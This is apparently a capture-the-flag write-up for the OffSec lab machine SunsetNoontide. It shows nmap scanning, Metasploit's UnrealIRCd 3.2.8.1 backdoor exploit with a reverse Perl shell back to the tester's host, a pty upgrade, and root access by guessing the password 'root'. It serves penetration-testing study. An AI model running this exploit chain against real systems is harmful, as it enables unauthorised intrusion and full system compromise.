# SunsetNoontide

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
This lab focuses on exploiting a remote code execution (RCE) vulnerability in the Unreal IRC server 
v3.2.8.1 to gain a foothold on the system. Privilege escalation is achieved using a weak root 
password, highlighting the importance of strong password management. It is recommended to run this 
machine in Virtualbox.
Released: 21 Dec 2020
```

Machine link: [https://portal.offsec.com/machine/sunsetnoontide-547/overview/details](https://portal.offsec.com/machine/sunsetnoontide-547/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/SunsetNoontide]
└─$ export TARGET_IP=192.168.197.120

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/SunsetNoontide]
└─$ sudo nmap -sC -sV -p- $TARGET_IP        
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 12:55 CET
Nmap scan report for 192.168.197.120
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.26 seconds
```

We have one service running:

- UnrealIRCd on ports 6667, 6697, and 8067

### Search for an exploit and try it out

Let's see if there are any available exploits

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/SunsetNoontide]
└─$ searchsploit unrealircd
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                               | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                    | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                                             | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                                                                                  | windows/dos/27407.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/SunsetNoontide]
└─$ searchsploit -m 16922  
  Exploit: UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16922
     Path: /usr/share/exploitdb/exploits/linux/remote/16922.rb
    Codes: CVE-2010-2075, OSVDB-65445
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /mnt/hgfs/OffSec_PG/PG_Play/Easy/SunsetNoontide/16922.rb

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/SunsetNoontide]
└─$ head -n 20 16922.rb
##
# $Id: unreal_ircd_3281_backdoor.rb 11227 2010-12-05 15:08:22Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::Tcp
```

We try out the exploit from within Metasploit

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/SunsetNoontide]
└─$ msfconsole -q                
msf > search unrealircd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor

msf > use 0
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.197.120
RHOSTS => 192.168.197.120
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload payload/cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS   192.168.197.120  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST tun0
LHOST => 192.168.45.201
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.45.201:4444 
[*] 192.168.197.120:6667 - Connected to 192.168.197.120:6667...
    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.197.120:6667 - Sending backdoor command...
[*] Command shell session 1 opened (192.168.45.201:4444 -> 192.168.197.120:37250) at 2026-02-21 13:10:33 +0100


id
uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
tty
not a tty
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
server@noontide:~/irc/Unreal3.2$ 
```

We have command execution.

### Get the user flag

Now we can start looking for the user flag

```bash
server@noontide:~/irc/Unreal3.2$ find / -type f -name local.txt 2>/dev/null
find / -type f -name local.txt 2>/dev/null
/home/server/local.txt
server@noontide:~/irc/Unreal3.2$ cat /home/server/local.txt
cat /home/server/local.txt
a<REDACTED>0
server@noontide:~/irc/Unreal3.2$ 
```

Nice, so far so good.

### Enumeration for privesc

We now enumerate the system for privilege escalation opportunities.

The lab description mentioned a weak root password so why not try to `su` with the credentials `root:root`?

```bash
server@noontide:~$ su -
su -
Password: root

root@noontide:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@noontide:~# 
```

And we are root!

### Get the root flag

Now we can get the root flag

```bash
root@noontide:~# cd /root                                                                       
cd /root
root@noontide:~# ls -l
ls -l
total 4
-rw------- 1 root root 33 Feb 21 06:55 proof.txt
root@noontide:~# cat proof.txt
cat proof.txt
7<REDACTED>b
root@noontide:~# 
```

For additional information, please see the references below.

## References

- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [IRC - Wikipedia](https://en.wikipedia.org/wiki/IRC)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [UnrealIRCd - Wikipedia](https://en.wikipedia.org/wiki/UnrealIRCd)
